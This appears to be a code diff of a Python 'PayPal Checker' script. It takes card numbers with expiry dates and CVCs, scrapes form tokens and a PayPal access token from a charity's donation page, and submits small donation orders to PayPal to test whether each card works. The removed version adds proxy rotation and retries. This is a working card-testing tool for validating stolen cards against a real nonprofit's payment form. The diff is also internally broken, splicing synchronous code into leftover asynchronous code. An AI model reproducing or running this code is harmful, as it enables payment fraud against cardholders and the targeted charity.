@@ -145,112 +145,199 @@ def reg(cc: str):
 
 
 # Async PayPal Checker with retry
-async def pali(ccx: str, max_retries=5):
-    for attempt in range(max_retries):
-        try:
-            ccx = ccx.strip()
-            n = ccx.split("|")[0]
-            mm = ccx.split("|")[1]
-            yy = ccx.split("|")[2]
-            cvc = ccx.split("|")[3].strip()
-            
-            if "20" in yy:
-                yy = yy.split("20")[1]
-            
-            proxy = get_next_proxy()
-            print(f"[DEBUG] Checking card: {n[:6]}...{n[-4:]} | Attempt: {attempt+1}/{max_retries} | Proxy: {proxy[:30] if proxy else 'None'}...")
-            
-            cookies = {
-                'cookieyes-consent': 'consentid:VFd5T1VzblFTS016M1QxdE9mVmdKMnNyRHFBaVpSTEM,consent:no,action:yes,necessary:yes,functional:no,analytics:no,performance:no,advertisement:no',
-                'wp-give_session_7bdbe48ab4780b5199a37cfdcdbc963f': '1d11eb8a1cdd169bf553f0b5053584cd%7C%7C1770959142%7C%7C1770955542%7C%7C11f978ac4f4ed635065daf8017f7cd4e',
-                'wp-give_session_reset_nonce_7bdbe48ab4780b5199a37cfdcdbc963f': '1',
-            }
-            
-            headers = {
-                'authority': 'ananau.org',
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-                'cache-control': 'max-age=0',
-                'referer': 'https://ananau.org/donate/donation/',
-                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-            }
-            
-            params = {
-                'form-id': '14343',
-                'payment-mode': 'paypal-commerce',
-                'level-id': '3',
-            }
-            
-            timeout = aiohttp.ClientTimeout(total=30)
-            
-            async with aiohttp.ClientSession(timeout=timeout) as session:
-                # First Request
-                print(f"[DEBUG] Step 1: Getting donation page...")
-                async with session.get(
-                    'https://ananau.org/donate/donation/',
-                    cookies=cookies,
-                    headers=headers,
-                    params=params,
-                    proxy=proxy
-                ) as r1:
-                    text1 = await r1.text()
-                    print(f"[DEBUG] Step 1 Response: Status={r1.status}, Length={len(text1)}")
-                
-                # Parse response
-                print(f"[DEBUG] Step 2: Parsing form data...")
-                id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', text1)
-                id_form2 = re.search(r'name="give-form-id" value="(.*?)"', text1)
-                nonec = re.search(r'name="give-form-hash" value="(.*?)"', text1)
-                enc = re.search(r'"data-client-token":"(.*?)"', text1)
-                
-                if not all([id_form1, id_form2, nonec, enc]):
-                    print(f"[DEBUG] ⚠️ PARSING_ERROR: Missing form fields")
-                    if attempt < max_retries - 1:
-                        print(f"[DEBUG] 🔄 Retrying in 2 seconds... (Attempt {attempt+2}/{max_retries})")
-                        await asyncio.sleep(2)
-                        continue
-                    print(f"[DEBUG] ❌ Max retries reached, returning PARSING_ERROR")
-                    return "PARSING_ERROR"
-                
-                id_form1 = id_form1.group(1)
-                id_form2 = id_form2.group(1)
-                nonec = nonec.group(1)
-                enc = enc.group(1)
-                dec = base64.b64decode(enc).decode('utf-8')
-                au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
-                print(f"[DEBUG] Parsed successfully: form_id={id_form2[:10]}...")
-                
-                # Second Request - Create Order
-                print(f"[DEBUG] Step 3: Creating PayPal order...")
-                headers2 = headers.copy()
-                headers2.update({
-                    'accept': '*/*',
-                    'origin': 'https://ananau.org',
-                    'referer': 'https://ananau.org/donate/donation/?form-id=14343&payment-mode=paypal-commerce&level-id=3',
-                })
-                
-                form_data = aiohttp.FormData()
-                form_data.add_field('give-honeypot', '')
-                form_data.add_field('give-form-id-prefix', id_form1)
-                form_data.add_field('give-form-id', id_form2)
-                form_data.add_field('give-form-title', 'Donation')
-                form_data.add_field('give-current-url', 'https://ananau.org/donate/donation/')
-                form_data.add_field('give-form-url', 'https://ananau.org/donate/donation/')
-                form_data.add_field('give-form-minimum', '10.00')
-                form_data.add_field('give-form-maximum', '999999.99')
-                form_data.add_field('give-form-hash', nonec)
-                form_data.add_field('give-price-id', 'custom')
-                form_data.add_field('give-amount', '10,00')
-                form_data.add_field('payment-mode', 'paypal-commerce')
-                form_data.add_field('give_first', 'fhjb')
-                form_data.add_field('give_last', 'lkh')
-                form_data.add_field('give_company_option', 'no')
-                form_data.add_field('give_company_name', '')
-                form_data.add_field('give_email', 'lagxd71@gmail.com')
-                form_data.add_field('card_name', 'Ali')
-                form_data.add_field('card_exp_month', '')
-                form_data.add_field('card_exp_year', '')
-                form_data.add_field('give-gateway', 'paypal-commerce')
+import requests
+def pali(ccx):
+		ccx=ccx.strip()
+		n = ccx.split("|")[0]
+		mm = ccx.split("|")[1]
+		yy = ccx.split("|")[2]
+		cvc = ccx.split("|")[3].strip()
+		if "20" in yy:
+			yy = yy.split("20")[1]
+		
+		r = requests.Session()
+		
+		cookies = {
+		    'cookieyes-consent': 'consentid:VFd5T1VzblFTS016M1QxdE9mVmdKMnNyRHFBaVpSTEM,consent:no,action:yes,necessary:yes,functional:no,analytics:no,performance:no,advertisement:no',
+		    'wp-give_session_7bdbe48ab4780b5199a37cfdcdbc963f': '1d11eb8a1cdd169bf553f0b5053584cd%7C%7C1770959142%7C%7C1770955542%7C%7C11f978ac4f4ed635065daf8017f7cd4e',
+		    'wp-give_session_reset_nonce_7bdbe48ab4780b5199a37cfdcdbc963f': '1',
+		}
+		
+		headers = {
+		    'authority': 'ananau.org',
+		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+		    'cache-control': 'max-age=0',
+		    'referer': 'https://ananau.org/donate/donation/',
+		    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+		    'sec-ch-ua-mobile': '?1',
+		    'sec-ch-ua-platform': '"Android"',
+		    'sec-fetch-dest': 'document',
+		    'sec-fetch-mode': 'navigate',
+		    'sec-fetch-site': 'same-origin',
+		    'sec-fetch-user': '?1',
+		    'upgrade-insecure-requests': '1',
+		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+		}
+		
+		params = {
+		    'form-id': '14343',
+		    'payment-mode': 'paypal-commerce',
+		    'level-id': '3',
+		}
+		
+		r1 = r.get('https://ananau.org/donate/donation/',  cookies=cookies, headers=headers, params =params)
+		
+		
+		import re, base64
+		id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1.text).group(1)
+		id_form2 = re.search(r'name="give-form-id" value="(.*?)"', r1.text).group(1)
+		nonec = re.search(r'name="give-form-hash" value="(.*?)"', r1.text).group(1)
+		enc = re.search(r'"data-client-token":"(.*?)"',r1.text).group(1)
+		dec = base64.b64decode(enc).decode('utf-8')
+		au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
+		
+		
+		
+		he5 = {
+		    'authority': 'ananau.org',
+		    'accept': '*/*',
+		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+		
+		    'origin': 'https://ananau.org',
+		    'referer': 'https://ananau.org/donate/donation/?form-id=14343&payment-mode=paypal-commerce&level-id=3',
+		    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+		    'sec-ch-ua-mobile': '?1',
+		    'sec-ch-ua-platform': '"Android"',
+		    'sec-fetch-dest': 'empty',
+		    'sec-fetch-mode': 'cors',
+		    'sec-fetch-site': 'same-origin',
+		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+		}
+		
+		params = {
+		    'action': 'give_paypal_commerce_create_order',
+		}
+		
+		files = {
+		    'give-honeypot': (None, ''),
+		    'give-form-id-prefix': (None, id_form1),
+		    'give-form-id': (None, id_form2),
+		    'give-form-title': (None, 'Donation'),
+		    'give-current-url': (None, 'https://ananau.org/donate/donation/'),
+		    'give-form-url': (None, 'https://ananau.org/donate/donation/'),
+		    'give-form-minimum': (None, '5.00'),
+		    'give-form-maximum': (None, '999999.99'),
+		    'give-form-hash': (None, nonec),
+		    'give-price-id': (None, 'custom'),
+		    'give-amount': (None, '5,00'),
+		    'payment-mode': (None, 'paypal-commerce'),
+		    'give_first': (None, 'fhjb'),
+		    'give_last': (None, 'lkh'),
+		    'give_company_option': (None, 'no'),
+		    'give_company_name': (None, ''),
+		    'give_email': (None, 'bnnbbhnn@gmail.com'),
+		    'card_name': (None, 'Ali'),
+		    'card_exp_month': (None, ''),
+		    'card_exp_year': (None, ''),
+		    'give-gateway': (None, 'paypal-commerce'),
+		}
+		
+		r1 = r.post('https://ananau.org/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, files=files).json()['data']['id']
+		
+		
+		
+		
+		
+		
+		headers = {
+		    'authority': 'cors.api.paypal.com',
+		    'accept': '*/*',
+		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+		    'authorization': f'Bearer {au}',
+		    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
+		    'content-type': 'application/json',
+		    'origin': 'https://assets.braintreegateway.com',
+		    'paypal-client-metadata-id': '6dd9d76b711be7e931681a9cf9438457',
+		    'referer': 'https://assets.braintreegateway.com/',
+		    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+		    'sec-ch-ua-mobile': '?1',
+		    'sec-ch-ua-platform': '"Android"',
+		    'sec-fetch-dest': 'empty',
+		    'sec-fetch-mode': 'cors',
+		    'sec-fetch-site': 'cross-site',
+		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+		}
+		
+		json_data = {
+		    'payment_source': {
+		        'card': {
+		            'number': n,
+		            'expiry': f'20{yy}-{mm}',
+		            'security_code': cvc,
+		            'attributes': {
+		                'verification': {
+		                    'method': 'SCA_WHEN_REQUIRED',
+		                },
+		            },
+		        },
+		    },
+		    'application_context': {
+		        'vault': False,
+		    },
+		}
+		
+		response = r.post(
+		    f'https://cors.api.paypal.com/v2/checkout/orders/{r1}/confirm-payment-source',
+		    headers=headers,
+		    json=json_data,
+		)
+		
+		
+		headers = {
+		    'authority': 'ananau.org',
+		    'accept': '*/*',
+		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+		
+		    'origin': 'https://ananau.org',
+		    'referer': 'https://ananau.org/donate/donation/?form-id=14343&payment-mode=paypal-commerce&level-id=3',
+		    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+		    'sec-ch-ua-mobile': '?1',
+		    'sec-ch-ua-platform': '"Android"',
+		    'sec-fetch-dest': 'empty',
+		    'sec-fetch-mode': 'cors',
+		    'sec-fetch-site': 'same-origin',
+		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+		}
+		
+		params = {
+		    'action': 'give_paypal_commerce_approve_order',
+		    'order': r1,
+		}
+		
+		files = {
+		    'give-honeypot': (None, ''),
+		    'give-form-id-prefix': (None, id_form1),
+		    'give-form-id': (None, id_form2),
+		    'give-form-title': (None, 'Donation'),
+		    'give-current-url': (None, 'https://ananau.org/donate/donation/'),
+		    'give-form-url': (None, 'https://ananau.org/donate/donation/'),
+		    'give-form-minimum': (None, '1.00'),
+		    'give-form-maximum': (None, '999999.99'),
+		    'give-form-hash': (None, nonec),
+		    'give-price-id': (None, 'custom'),
+		    'give-amount': (None, '1,00'),
+		    'payment-mode': (None, 'paypal-commerce'),
+		    'give_first': (None, 'fhjb'),
+		    'give_last': (None, 'lkh'),
+		    'give_company_option': (None, 'no'),
+		    'give_company_name': (None, ''),
+		    'give_email': (None, 'bnnbbhnn@gmail.com'),
+		    'card_name': (None, 'Ali'),
+		    'card_exp_month': (None, ''),
+		    'card_exp_year': (None, ''),
+		    'give-gateway': (None, 'paypal-commerce'),
+		}
                 
                 async with session.post(
                     'https://ananau.org/wp-admin/admin-ajax.php',
